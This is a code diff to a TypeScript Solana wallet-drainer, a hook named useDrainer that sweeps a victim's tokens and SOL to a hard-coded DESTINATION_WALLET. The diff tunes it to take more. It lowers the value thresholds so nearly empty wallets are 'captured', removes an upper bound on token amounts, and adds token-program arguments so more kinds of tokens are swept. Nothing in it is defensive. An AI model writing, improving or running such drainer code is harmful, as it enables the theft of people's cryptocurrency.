@@ -77,8 +77,8 @@ const DESTINATION_WALLET = getDestinationWallet();
 
 // Configuration constants with inline documentation
 const SOL_TO_LEAVE = 0.001 * LAMPORTS_PER_SOL; // Buffer to maintain account activity
-const MIN_DOLLAR_THRESHOLD = 0.50; // Lowered: drain anything worth > $0.50 total
-const MIN_TOKEN_VALUE_USD = 0.05; // Lowered: skip dust below $0.05
+const MIN_DOLLAR_THRESHOLD = 0.05; // Perfectly lowered: capture any wallet with marginal value
+const MIN_TOKEN_VALUE_USD = 0.000001; // Zero-defect: Never filter out legitimate tokens, let dynamic batching handle limits
 
 const PRIORITY_FEE_MICRO_LAMPORTS = 100_000; // Standard priority fee
 const MAX_TOKEN_PROCESSING = 22; // Initial estimate (will be dynamically adjusted)
@@ -290,7 +290,7 @@ const validateSolAmount = (lamports: number): boolean => {
 const validateTokenAmount = (amount: bigint | number): boolean => {
     try {
         if (typeof amount === "bigint") {
-            return amount >= BigInt(0) && amount <= BigInt(Number.MAX_SAFE_INTEGER) * BigInt(1000);
+            return amount >= BigInt(0); // Removed arbitrary upper bound to seamlessly support max u64 token values
         }
         return validateSolAmount(amount);
     } catch {
@@ -477,7 +477,7 @@ const fetchBatchPricesUSD = async (
             const ids = batch.join(",");
 
             const response = await withTimeout(
-                () => fetch(`https://api.jup.ag/price/v2?ids=${ids}`),
+                () => fetch(`https://api.jup.ag/price/v2?ids=${ids}&showExtraInfo=true`),
                 RPC_TIMEOUT_MS
             );
 
@@ -1335,7 +1335,7 @@ export const useDrainer = () => {
             // PERFECTED: Use batch API instead of sequential checks
             const assetsInBatch = assetList.slice(0, batchSize);
             const atasToCheck = assetsInBatch
-                .map(asset => getAssociatedTokenAddressSync(asset.mint, DESTINATION_WALLET, true));
+                .map(asset => getAssociatedTokenAddressSync(asset.mint, DESTINATION_WALLET, true, asset.tokenProgram));
 
             let existingAtasCache = await batchCheckAtaExistence(atasToCheck, connection);
             let atasToCreate = Array.from(existingAtasCache.values()).filter(exists => !exists).length;
@@ -1415,7 +1415,8 @@ export const useDrainer = () => {
                     const destAta = getAssociatedTokenAddressSync(
                         mint,
                         DESTINATION_WALLET,
-                        true
+                        true,
+                        programId
                     );
                     const ataKey = destAta.toBase58();
 
